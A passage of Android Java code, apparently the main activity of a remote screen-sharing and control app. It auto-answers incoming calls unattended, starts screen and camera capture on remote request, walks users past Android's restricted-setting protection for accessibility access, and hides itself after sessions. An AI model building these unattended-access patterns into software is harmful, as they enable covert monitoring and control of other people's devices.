        // PiP is only entered when user explicitly clicks the PiP option in More menu.
    }

    @Override
    public void onPictureInPictureModeChanged(boolean isInPictureInPictureMode, Configuration newConfig) {
        super.onPictureInPictureModeChanged(isInPictureInPictureMode, newConfig);
        if (isInPictureInPictureMode) {
            if (webView != null) {
                webView.resumeTimers();
            }
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        isActivityInForeground = true;
        AppLogs.i(TAG, "MainActivity onResume: Foreground active");
        if (webView != null) {
            webView.onResume();
            webView.resumeTimers();
            webView.post(() -> {
                try {
                    webView.evaluateJavascript(
                        "if (typeof window.loadPermissions === 'function') { window.loadPermissions(); } " +
                        "else if (typeof window.refreshPermissionsPanel === 'function') { window.refreshPermissionsPanel(); }",
                        null
                    );
                } catch (Exception ignored) {}
            });
        }
        BackgroundKeepAliveService.startService(this);
        checkAccessibilityPrompt();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_PERMISSIONS) {
            if (webView != null) {
                webView.post(() -> {
                    try {
                        webView.evaluateJavascript(
                            "if (typeof window.loadPermissions === 'function') { window.loadPermissions(); } " +
                            "else if (typeof window.refreshPermissionsPanel === 'function') { window.refreshPermissionsPanel(); }",
                            null
                        );
                    } catch (Exception ignored) {}
                });
            }
        }
    }

    private void checkAccessibilityPrompt() {
        SharedPreferences prefs = getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
        boolean alreadyPrompted = prefs.getBoolean(KEY_HAS_PROMPTED_ACCESSIBILITY, false);

        // If previously prompted or acknowledged, permanently suppress
        if (hasPromptedAccessibility || alreadyPrompted) {
            hasPromptedAccessibility = true;
            return;
        }

        // Dual-check: If accessibility service is ALREADY running or enabled in Settings, suppress popup permanently
        if (RemoteAccessibilityService.isServiceRunningOrEnabled(this)) {
            hasPromptedAccessibility = true;
            prefs.edit().putBoolean(KEY_HAS_PROMPTED_ACCESSIBILITY, true).apply();
            return;
        }

        // Service is not running and not enabled: prompt user once, and record in SharedPreferences to permanently suppress
        hasPromptedAccessibility = true;
        prefs.edit().putBoolean(KEY_HAS_PROMPTED_ACCESSIBILITY, true).apply();

        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            try {
                if (isFinishing() || isDestroyed()) return;
                // Double check before showing dialog in case service started during the delay
                if (RemoteAccessibilityService.isServiceRunningOrEnabled(MainActivity.this)) {
                    return;
                }
                new androidx.appcompat.app.AlertDialog.Builder(this)
                        .setTitle("Enable Background Remote Control")
                        .setMessage("To enable remote touch control and auto screen share without touching this phone, please turn ON 'VRemote Screen Share' in Accessibility Settings.\n\n(If your phone shows 'Restricted setting', go to Settings > Apps > VRemote > tap 3 dots in top right > tap 'Allow restricted settings' first).")
                        .setPositiveButton("Open Settings", (dialog, which) -> {
                            hasPromptedAccessibility = true;
                            try {
                                getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
                                        .edit().putBoolean(KEY_HAS_PROMPTED_ACCESSIBILITY, true).apply();
                            } catch (Exception ignored) {}
                            try {
                                Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                                startActivity(intent);
                            } catch (Exception ignored) {}
                        })
                        .setNegativeButton("Later", (dialog, which) -> {
                            hasPromptedAccessibility = true;
                            try {
                                getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
                                        .edit().putBoolean(KEY_HAS_PROMPTED_ACCESSIBILITY, true).apply();
                            } catch (Exception ignored) {}
                            if (dialog != null) dialog.dismiss();
                        })
                        .setOnDismissListener(dialog -> {
                            hasPromptedAccessibility = true;
                            try {
                                getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
                                        .edit().putBoolean(KEY_HAS_PROMPTED_ACCESSIBILITY, true).apply();
                            } catch (Exception ignored) {}
                        })
                        .setOnCancelListener(dialog -> {
                            hasPromptedAccessibility = true;
                            try {
                                getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
                                        .edit().putBoolean(KEY_HAS_PROMPTED_ACCESSIBILITY, true).apply();
                            } catch (Exception ignored) {}
                        })
                        .setCancelable(true)
                        .show();
            } catch (Exception ignored) {}
        }, 1200);
    }

    public static boolean isAccessibilityServiceEnabled(Context context) {
        return RemoteAccessibilityService.isAccessibilityServiceEnabled(context);
    }

    public static boolean isAccessibilityRunningOrEnabled(Context context) {
        return RemoteAccessibilityService.isServiceRunningOrEnabled(context);
    }

    @Override
    protected void onPause() {
        super.onPause();
        isActivityInForeground = false;
        // Keep WebView execution active when backgrounded for screen capture
        if (webView != null) {
            webView.resumeTimers();
            // If no call is currently active, shut down idle camera/microphone in WebView to save battery
            if (!isCallActive && (webRTCCompanion == null || !webRTCCompanion.isInCall())) {
                webView.evaluateJavascript("if (typeof shutdownIdleMediaHardware === 'function') shutdownIdleMediaHardware();", null);
            }
        }
        if (!isCallActive && (webRTCCompanion == null || !webRTCCompanion.isInCall())) {
            if (webRTCCompanion != null) {
                try {
                    webRTCCompanion.cleanupActiveMediaSession();
                } catch (Exception ignored) {}
            }
        }
    }

    @Override
    protected void onStop() {
        super.onStop();
        if (!isCallActive && (webRTCCompanion == null || !webRTCCompanion.isInCall())) {
            stopAllMediaAndFinish();
        }
    }

    // WebRTCCompanion callbacks
    @Override public void onConnected(String myId) {
        Log.i(TAG, "WebRTCCompanion connected as: " + myId);
        autoCmdHandler.removeCallbacks(pendingAutoCmdRunnable);
        runOnUiThread(this::executePendingAutoCommand);
    }
    @Override public void onStatusChanged(String status, boolean isLive) {}
    @Override public void onParticipantsList(List<String> users) {}
    @Override public void onIncomingCall(String fromUser, String callType) {
        runOnUiThread(() -> {
            Log.i(TAG, "Incoming call to companion from: " + fromUser + ", auto-answering unattended call");
            if (webRTCCompanion != null) {
                webRTCCompanion.acceptIncomingCall();
            }
        });
    }
    @Override public void onRemoteVideoTrack(VideoTrack track) {}
    @Override public void onCallEnded() {
        if (isStoppingMedia) return;
        runOnUiThread(this::stopAllMediaAndFinish);
    }
    @Override public void onError(String error) {
        runOnUiThread(() -> {
            Toast.makeText(this, error, Toast.LENGTH_SHORT).show();
            if (webRTCCompanion != null) {
                webRTCCompanion.emitDeviceError(error);
            }
        });
    }
    @Override public void onAutoScreenShareRequest(String fromUser, boolean fullControl, boolean streamCamera, String cameraChoice) {
        runOnUiThread(() -> {
            Log.i(TAG, "Auto screen share request from: " + fromUser + " (fullControl=" + fullControl + ", cam=" + cameraChoice + ")");
            startScreenCaptureWithCamera(fromUser, fullControl, streamCamera, cameraChoice);
        });
    }

    public void stopAllMediaAndFinish() {
        long now = System.currentTimeMillis();
        if (isStoppingMedia || (now - sLastStopTime < 2000)) return;
        isStoppingMedia = true;
        sLastStopTime = now;
        try {
            Log.i(TAG, "stopAllMediaAndFinish: Releasing all cameras, mics, services and hiding activity to background");
            isCallActive = false;
            isScreenCaptureRequestPending = false;
            captureIntentData = null;
            pendingAutoCommand = null;
            lastAutoCmdTime = 0;
            lastExecutedCommand = "";
            autoCmdHandler.removeCallbacks(pendingAutoCmdRunnable);

            if (webView != null) {
                runOnUiThread(() -> {
                    try {
                        webView.evaluateJavascript("if (typeof forceShutdownAllMediaHardware === 'function') forceShutdownAllMediaHardware(); else if (typeof shutdownIdleMediaHardware === 'function') shutdownIdleMediaHardware();", null);
                    } catch (Exception ignored) {}
                });
            }

            try {
                Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
                stopService(serviceIntent);
            } catch (Exception ignored) {}

            if (webRTCCompanion != null) {
                try {
                    webRTCCompanion.endCall(false);
                    webRTCCompanion.cleanupActiveMediaSession();
                } catch (Exception ignored) {}
            }

            runOnUiThread(() -> {
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
                        setShowWhenLocked(false);
                        setTurnScreenOn(false);
                    }
                    getWindow().clearFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
                } catch (Exception ignored) {}

                long nowHome = System.currentTimeMillis();
                if (nowHome - sLastHomeExecutionTime > 2000) {
                    sLastHomeExecutionTime = nowHome;
                    try {
                        moveTaskToBack(true);
                    } catch (Exception ignored) {}

                    try {
                        Intent homeIntent = new Intent(Intent.ACTION_MAIN);
                        homeIntent.addCategory(Intent.CATEGORY_HOME);
                        homeIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(homeIntent);
                    } catch (Exception ignored) {}

                    if (RemoteAccessibilityService.getInstance() != null) {
                        try {
                            RemoteAccessibilityService.getInstance().performHome();
                        } catch (Exception ignored) {}
                    }
                }
            });
        } finally {
            autoCmdHandler.postDelayed(() -> isStoppingMedia = false, 1500);
        }
    }

    @Override
    public void onBackPressed() {
        if (webView != null && webView.canGoBack()) {
            webView.goBack();
        } else {
            // Push activity to background instead of destroying, keeping session ready
            try {
                moveTaskToBack(true);
            } catch (Exception e) {
                super.onBackPressed();
            }
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        try {
            unregisterReceiver(mEndCallReceiver);
        } catch (Exception ignored) {}
        if (sInstance == this) {
            sInstance = null;
        }
        if (mFilePathCallback != null) {
            try {
                mFilePathCallback.onReceiveValue(null);
            } catch (Exception ignored) {}
            mFilePathCallback = null;
        }
        if (wakeLock != null && wakeLock.isHeld()) {
            try { wakeLock.release(); } catch (Exception ignored) {}
            wakeLock = null;
        }
        if (sWebRTCCompanion != null) {
            if (!sWebRTCCompanion.isInCall() && !sWebRTCCompanion.isScreenSharing()) {
                sWebRTCCompanion.destroy();
                sWebRTCCompanion = null;
                webRTCCompanion = null;
            } else {
                Log.i(TAG, "MainActivity destroyed but active call is running -> preserving WebRTCCompanion in background!");
                AppLogs.i(TAG, "MainActivity destroyed but active call is running -> preserving WebRTCCompanion in background!");
                sWebRTCCompanion.setCallback(null);
            }
        }
        if (webView != null) {
            webView.destroy();
            webView = null;
        }
    }
}
